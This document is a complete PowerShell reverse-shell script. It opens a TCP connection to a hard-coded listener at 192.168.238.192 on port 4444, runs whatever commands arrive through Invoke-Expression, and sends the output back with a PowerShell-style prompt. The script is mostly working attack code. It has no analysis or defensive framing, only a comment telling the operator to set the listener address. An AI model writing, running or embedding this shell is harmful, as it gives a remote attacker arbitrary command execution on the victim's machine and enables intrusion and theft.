function Invoke-PowerShellSession {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteHost,

        [Parameter(Mandatory=$true)]
        [int]$RemotePort,

        [int]$TimeoutSeconds = 30  # Default timeout value in seconds
    )

    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($RemoteHost, $RemotePort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        # Send a welcome message with the initial prompt
        $initialPrompt = "PS " + (Get-Location).Path + "> "
        $writer.Write("Connected to remote PowerShell session.`r`n" + $initialPrompt)

        while ($true) {
            # Set a timeout for reading input
            $timeout = [System.DateTime]::Now.AddSeconds($TimeoutSeconds)
            
            # Read commands from the listener with timeout
            $command = $null
            while (([System.DateTime]::Now -lt $timeout) -and ($command -eq $null)) {
                if ($stream.DataAvailable) {
                    $command = $reader.ReadLine()
                }
                Start-Sleep -Milliseconds 100  # Sleep for a short duration to avoid busy waiting
            }

            # If no command is received within the timeout period, break the loop
            if ($command -eq $null) {
                break
            }

            # Check if the user wants to exit
            if ($command -eq "exit") {
                break
            }

            try {
                # Execute the command within PowerShell and capture the output
                $output = Invoke-Expression $command 2>&1 | Out-String
                # Process each line, excluding completely blank lines
                $output -split "`r`n" | Where-Object { $_.Trim() -ne "" } | ForEach-Object {
                    $writer.Write($_.TrimEnd() + "`r`n")
                }
            } catch {
                $errorMessage = $_.Exception.Message
                $writer.Write("Error in session: $errorMessage`r`n")
            }

            # Provide a PowerShell-like prompt with the current path
            $prompt = "PS " + (Get-Location).Path + "> "
            $writer.Write($prompt)
        }

        $client.Close()
    } catch {
        Write-Host "Error: $_"
    }
}

# Set your listener's IP address and port
$listenerIP = "192.168.238.192"
$listenerPort = 4444

try {
    Invoke-PowerShellSession -RemoteHost $listenerIP -RemotePort $listenerPort
} catch {
    Write-Host "Error: $_"
}

